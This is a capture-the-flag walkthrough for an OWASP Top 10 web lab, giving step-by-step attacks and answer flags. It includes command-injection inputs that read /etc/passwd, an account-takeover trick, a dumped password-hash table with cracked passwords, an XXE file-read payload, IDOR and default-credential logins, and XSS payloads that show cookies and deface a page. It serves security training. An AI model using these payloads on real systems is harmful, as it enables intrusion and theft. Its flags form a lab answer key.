# OWASP Top 10

This challenge consists information about OWASP(Open Web Application Security Project) Top 10 web vulnerabilites.

Which are

1. Injection
2. Broken Authentication.
3. Sensitive Data Exposure
4. XML Extrenal Entity
5. Broken Access Control
6. Security Misconfiguration
7. Cross-site Scripting
8. Insecure Deserialization
9. Components with known vulnerabilities
10. Insufficient Logging & Monitoring

### Task 1-4 

Has information about command injections and how these can be leverrages DO HAVE A LOOK at it.

### Task 5 - CMD Injection Practical

Deploy the machine and navigate to http://IPaddress/evilshell.php

And we will be invited with EvilShell input form where we can do our command injection.

#### Questions

...

	1. What strange text file is in the website root directory?
		- Ans: drpepper.txt (input -> ls)
	2. How many non-root/non-service/non-daemon users are there?
		- Ans: 0 (input -> cat /etc/passwd)
	3. What user is this app running as?
		- Ans: www-data (input -> whoami)
	4. What is the user's shell set as?
		- Ans: /usr/sbin/nologin (input -> cat /etc/passwd)
	5. What version of Ubuntu is running?
		- Ans: 18.0.4 (input -> lsb_release -a)
	6. Print out the MOTD. What favorite beverage is shown
		- Ans: Dr pepper (input -> cat /etc/update-motd.d/00-header)
...

### Task 6-7 Broken Authentication

Aye Yo give the description a read tho!!!

Deploy the machine and go to http://IPaddress:8888

And try to login with username as Darren. You can see that it shows there is an account with that username.

Now try to register with same Username with a space at the end and random email and password it shows no error so now proceed to login with darren with space at end with the password that you gave during registration.

Now you have darren's account.

#### Questions

...

	1. What is the flag that you found in darren's account?
		- Ans: fe86079416a21a3c99937fea8874b667
	2. Now try to do the same trick and see if you can login as arthur?
		- Ans: No answer needed (repeat the same for arthur)
	3. What is the flag that you found in arthur's account?
		- Ans: d9ac0f7db4fda460ac3edeb75d75e16e
...


### Task 8-11 Sensitive Data Expoure

Deploy the machine. Open the web page and have a look at it it says nothing interesting.

Now lets use gobuster to find any pages.

`gobuster dir -u http://10.10.151.201/ -w /usr/share/dirb/wordlists/common.txt`

Gave us

...

	/.hta (Status: 403)
	/.htaccess (Status: 403)
	/.htpasswd (Status: 403)
	/api (Status: 301) -> Endpoint doesnt exist
	/assets (Status: 301) -> the one
	/console (Status: 301) -> Unauthorized
	/favicon.ico (Status: 200)
	/index.php (Status: 200)	
	/login (Status: 301)
	/server-status (Status: 403)
...

If open /assets/ we have a file with name webapp.db 

`
sqlite3                                                                 
SQLite version 3.33.0 2020-08-14 13:23:32
Enter ".help" for usage hints.
Connected to a transient in-memory database.
Use ".open FILENAME" to reopen on a persistent database.
sqlite> .open webapp.db
sqlite> .tables
sessions  users   
sqlite> select * from users;
4413096d9c933359b898b6202288a650|admin|6eea9b7ef19179a06954edd0f6c05ceb|1
23023b67a32488588db1e28579ced7ec|Bob|ad0234829205b9033196ba818f7a872b|1
4e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|0
`

Now lets crack the passwords using crackstion or something

we get passwords

admin: qwertyuiop
Alice: test2

Now login with the admin credentials.

#### Questions 

...

	1. What is the name of the mentioned directory?
		- Ans: /assets
	2.	Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?
		- Ans: webapp.db
	3. Use the supporting material to access the sensitive data. What is the password of the hash of the admin user?
		- Ans: 6eea9b7ef19179a06954edd0f6c05ceb
	4. What is the admin's plaintext password?
		- Ans: qwertyuiop
	5. Login as the admin. What is the flag?
		- Ans: THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}

...

### Task 12 - 16 [XML External Entity]

Deploy the machine

In the payload area try to play around with XML payloads.

To see the /etc/passwd we can use the following payload

`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>`

#### Questions
...

	1. Full form of XML
		- Ans: Extensible Markup Language
	2. Is it compulsory to have XML prolog in XML documents?
		- Ans: No
	3. Can we validate XML documents against a schema?
		- Ans: Yes
	4. How can we specify XML version and encoding in XML document?
		- Ans: XML prolog
	5. How do you define a new ELEMENT?
		- Ans: !ELEMENT
	6. How do you define a ROOT element?
		- Ans: !DOCTYPE
	7. How do you define a new ENTITY element?
		- Ans: !ENTITY
	8. Try the payload mentioned in description on the website.
		- Ans: No answer needed
	9. Try to display your own name using any payload.
		- Ans: No answer needed but use the following script<!--?xml version="1.0" ?-->
			<!DOCTYPE replace [<!ENTITY example "SU"> ]>
			 <userInfo>
  				<firstName>Presden</firstName>
  				<lastName>&example;</lastName>
			 </userInfo>
	10. See if you can read the /etc/passwd
		- Ans: No answer needed
	11. What is the name of the user in /etc/passwd?
		- Ans: Falcon
	12. Where is falcon's SSH key located?
		- Ans: /home/falcon/.ssh/id_rsa
	13. What are the first 18 characters for falcon's private key?
		- Ans: MIIEogIBAAKCAQEA7b

...

### Task 17-18 [Broken Access Control]

Deploy the machine and login with the credentials given. 
Once you login into the user account have a look at the url `note.php?note=1`.
Hmmm let's try to change the note value to 0 and see what happens
Nice it gave the flag - flag{fivefourthree} 

#### Questions
...

	1. Read and understand how IDOR works.
		- Ans: No answer needed
	2. Deploy the machine and go to http://10.10.201.239 - Login with the username being noot and the password test1234.
		- Ans: No answer needed
	3. Look at other users notes. What is the flag?
		- Ans: flag{fivefourthree} 
....

### Task 19 [Security Misconfiguration]

Deploy the machine and have a look at the interface

This challenege covers basics of how default passwords are a threat and they should be removed or changes at once.

The title of the webpage says pensive notes lets do some research on it.

Pensive notes is made by  NinjaJc01 on github lets look at that [repo](https://github.com/NinjaJc01/PensiveNotes)

Oh wait there is default password available lets login with it `pensive:PensiveNotes`.

Nice we now have the flag

#### Questions

...

	1. Deploy the VM
		- Ans: No answer needed
	2. Hack into the webapp, and find the flag!
	 	- Ans: thm{4b9513968fd564a87b28aa1f9d672e17}

...

### Task 20 [XSS - Cross Site Scripting]

This challenge covers basic 3 XSS Cross Site Scripting attacks Stored, Reflective and DOM

For Reflected challenge we were given to pop up hello and our machin IP as pop ups to get the flag.

`<script>alert("Hello")</script>` pops up Hello
`<script>alert(window.location.host)</script>` pops up our IP

For stored xss
We first need to register and we will be the given something that is similar to that of global messaging fourm.

Now lets get back to scripting

Lets use the following sciprt

To manipulate html tags
...
	
	<html>
	<body>
	<h1>Buhahaha</h1>
	<button type="button" onclick="alert('GG!')">Click Me</button>
	</body>
	</html>

...

To get cookis as a pop-up

...

	<script>alert(document.cookie)</script>
...

To deface a website using JS and html manipulation.

...

	<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>
...

#### Questions

...

	1.  Deploy the VM
		- Ans: No answer needed
	2. Navigate to http://10.10.244.98/ in your browser and click on the "Reflected XSS" tab on the navbar; craft a reflected XSS payload that will cause a popup saying "Hello".
		- Ans: ThereIsMoreToXSSThanYouThink
	3. On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.
		- Ans: ReflectiveXss4TheWin
	4. Then add a comment and see if you can insert some of your own HTML.
		- Ans: HTML_T4gs
	5. On the same page, create an alert popup box appear on the page with your document cookies.
		- Ans: W3LL_D0N3_LVL2
	6. Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.
		- Ans: websites_can_be_easily_defaced_with_xss

...

### Task 21 - To be continued...
